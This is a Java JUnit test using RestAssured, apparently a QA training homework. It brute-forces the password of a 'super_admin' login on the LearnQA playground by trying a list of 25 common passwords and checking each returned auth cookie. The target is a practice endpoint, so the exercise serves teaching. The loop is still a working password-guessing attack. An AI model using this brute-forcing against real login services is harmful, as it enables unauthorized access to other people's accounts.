import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class PasswordSelectionTest {
    @Test
    public void testPasswordSelection() {

        String[] popularPass = {"123456", "123456789", "qwerty", "password", "1234567",
                "12345678", "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123",
                "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777",
                "welcome", "888888", "princess", "dragon", "password1", "123qwe"};

        List<String> listPass = Arrays.asList(popularPass);


        for (String pass : listPass) {

            Map<String, Object> body = new HashMap<>();
            body.put("login", "super_admin");
            body.put("password", pass);

            Response responseGetSecret = RestAssured
                    .given()
                    .body(body)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String responseCookies = responseGetSecret.getCookies().get("auth_cookie");


            Response responseCheckAuth = RestAssured
                    .given()
                    .body(body)
                    .cookie("auth_cookie", responseCookies)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            String textResponse = responseCheckAuth.htmlPath().get().toString();

            if (!textResponse.equals("You are NOT authorized")) {
                System.out.println(responseCheckAuth.htmlPath().get());
                System.out.println("True password " + pass);
                break;
            }
        }
    }
}
